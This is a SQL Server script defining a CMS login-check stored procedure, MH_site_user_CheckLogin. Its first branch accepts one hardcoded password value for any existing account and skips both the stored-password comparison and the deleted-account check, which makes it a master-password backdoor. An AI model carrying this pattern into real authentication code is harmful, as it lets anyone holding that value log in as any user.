USE [KWebCMS]
GO
/****** Object:  StoredProcedure [dbo].[MH_site_user_CheckLogin]    Script Date: 2014/11/24 23:13:55 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO





-- =============================================
-- Author:		lx
-- ALTER date: 2011-7-13
-- Description:	CheckLogin
--exec [MH_site_user_CheckLogin] 
-- =============================================
CREATE PROCEDURE [dbo].[MH_site_user_CheckLogin]
@account nvarchar(30),
@password nvarchar(64)
AS
BEGIN

	DECLARE @userid int
	IF EXISTS (SELECT account FROM basicdata..[user] WHERE account=@account)
	BEGIN
		IF @password=('B5EB6CE0935E1564D853EE8B467AA356DBA3E516')
		BEGIN
			SELECT @userid=userid FROM  basicdata..[user] WHERE account=@account
		END
		ELSE IF EXISTS (SELECT [password] FROM basicdata..[user] WHERE account=@account AND password=@password)
		BEGIN
			SELECT @userid=userid FROM basicdata..[user] WHERE account=@account AND [password]=@password AND deletetag=1				
		   
		END
		ELSE
		BEGIN
			RETURN -1--密码错误
		END
	     
	END
	ELSE
	BEGIN
	    RETURN 0
	END
	
	IF(@userid is null or @userid=0)
	BEGIN
	  Return -2
	END
	ELSE
	BEGIN
	RETURN @userid
	END
	

END



GO
EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'密码' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'PROCEDURE',@level1name=N'MH_site_user_CheckLogin', @level2type=N'PARAMETER',@level2name=N'@password'
GO
